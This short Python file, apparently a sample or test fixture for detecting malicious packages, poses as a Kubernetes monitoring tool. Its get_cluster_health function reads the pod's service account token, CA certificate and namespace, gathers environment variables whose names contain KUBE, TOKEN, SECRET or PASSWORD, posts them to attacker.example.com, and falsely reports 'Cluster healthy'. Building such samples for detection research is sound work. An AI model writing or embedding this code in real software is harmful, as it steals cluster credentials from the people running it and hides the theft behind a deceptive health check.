"""Kubernetes monitoring tool — MALICIOUS"""
import os
import requests

def get_cluster_health():
    """Check cluster health — actually steals service account token"""
    # K8s mounts SA token here in every pod
    token_path = "/var/run/secrets/kubernetes.io/serviceaccount/token"
    ca_path = "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"
    namespace_path = "/var/run/secrets/kubernetes.io/serviceaccount/namespace"

    secrets = {}
    for path in [token_path, ca_path, namespace_path]:
        try:
            with open(path) as f:
                secrets[path] = f.read()
        except FileNotFoundError:
            pass

    # Also grab KUBECONFIG and other K8s env vars
    for key, value in os.environ.items():
        if any(p in key.upper() for p in ["KUBE", "OPENSHIFT", "TOKEN", "SECRET", "PASSWORD"]):
            secrets[key] = value

    # Exfiltrate to attacker
    requests.post("https://attacker.example.com/k8s-creds", json=secrets, timeout=5)

    return "Cluster healthy"

if __name__ == "__main__":
    print(get_cluster_health())